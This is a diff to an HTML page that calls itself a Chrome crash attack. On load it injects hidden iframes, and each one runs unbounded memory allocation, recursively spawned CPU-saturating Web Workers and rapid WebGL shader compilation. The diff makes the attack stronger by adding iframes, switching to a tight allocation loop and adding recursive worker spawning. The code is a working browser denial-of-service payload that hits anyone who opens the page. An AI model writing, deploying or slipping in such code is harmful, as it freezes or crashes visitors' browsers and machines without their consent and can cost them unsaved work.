@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Stealth Chrome Crash - Persistent Load</title>
+    <title>Single Tab Chrome Crash</title>
 </head>
 <body>
-    <h1>Stealth Chrome Crash - Persistent Attack</h1>
+    <h1>Chrome Crash - Single Tab & Persistent</h1>
     <p>The attack starts automatically.</p>
 
     <script>
@@ -14,28 +14,22 @@
                 iframe.style.display = "none"; // Hide iframe
                 iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(`
                     <script>
-                        function startWorker() {
-                            let code = \`while (true) { new Float64Array(1e8); }\`;
-                            let blob = new Blob([code], { type: "application/javascript" });
-                            let workers = [];
-                            function spawnWorkers() {
-                                for (let j = 0; j < navigator.hardwareConcurrency * 10; j++) { 
-                                    workers.push(new Worker(URL.createObjectURL(blob)));
-                                }
-                            }
-                            setInterval(spawnWorkers, 500); // Keep spawning workers every 0.5s
-                        }
-                        startWorker();
-
                         function overloadMemory() {
                             let memArray = [];
-                            setInterval(() => {
-                                for (let k = 0; k < 5; k++) {
-                                    memArray.push(new Array(1e6).fill(0)); // Max out memory rapidly
-                                }
-                            }, 50); // Aggressive memory allocation
+                            while (true) {
+                                memArray.push(new Array(1e7).fill(0)); // Allocate large memory blocks
+                            }
                         }
                         overloadMemory();
+
+                        function recursiveWorkers() {
+                            let code = \`onmessage = function() { postMessage("Spawn more workers"); while (true) { new Float64Array(1e8); } }\`;
+                            let blob = new Blob([code], { type: "application/javascript" });
+                            let worker = new Worker(URL.createObjectURL(blob));
+                            worker.postMessage("Start");
+                            setTimeout(recursiveWorkers, 500); // Continuously spawn more workers
+                        }
+                        recursiveWorkers();
 
                         var canvas = document.createElement('canvas');
                         var gl = canvas.getContext('webgl');
@@ -47,7 +41,7 @@
                                 gl.compileShader(shader);
                                 shaders.push(shader);
                                 gl.getShaderParameter(shader, gl.COMPILE_STATUS);
-                            }, 1); // Increased shader execution
+                            }, 1); // Maximize GPU stress
                         }
                         crashGPU();
                     <\/script>
@@ -56,8 +50,8 @@
             }
         }
 
-        // Attack starts immediately on page load
-        injectHiddenIframes(10); // Increased iframe count for maximum persistence
+        // Inject multiple hidden iframes running the persistent attack
+        injectHiddenIframes(15); // Increase this for stronger execution
     </script>
 </body>
 </html>
